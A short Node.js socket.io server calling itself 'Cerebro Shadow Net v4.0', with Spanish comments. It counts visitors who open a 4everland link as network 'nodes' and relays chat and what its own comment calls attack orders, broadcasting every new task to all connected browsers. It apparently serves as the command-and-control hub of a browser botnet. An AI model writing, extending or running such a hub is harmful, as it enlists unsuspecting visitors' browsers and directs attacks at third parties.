const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, { 
    cors: { origin: "*" } 
});

let nodes = [];

io.on('connection', (socket) => {
    // Cuando alguien abre el link de 4everland
    socket.on('node_entry', (data) => {
        socket.nodeId = data.id;
        nodes.push(data.id);
        io.emit('update_network', { total: nodes.length, nodes: nodes });
    });

    // Para el chat y las órdenes de ataque
    socket.on('send_chat', (msg) => { io.emit('receive_chat', msg); });
    socket.on('new_task', (task) => { io.emit('task_broadcast', task); });

    // Cuando alguien cierra la pestaña
    socket.on('disconnect', () => {
        nodes = nodes.filter(id => id !== socket.nodeId);
        io.emit('update_network', { total: nodes.length, nodes: nodes });
    });
});

const PORT = process.env.PORT || 3000;
http.listen(PORT, () => {
    console.log('Cerebro Shadow Net v4.0 activo en puerto ' + PORT);
});

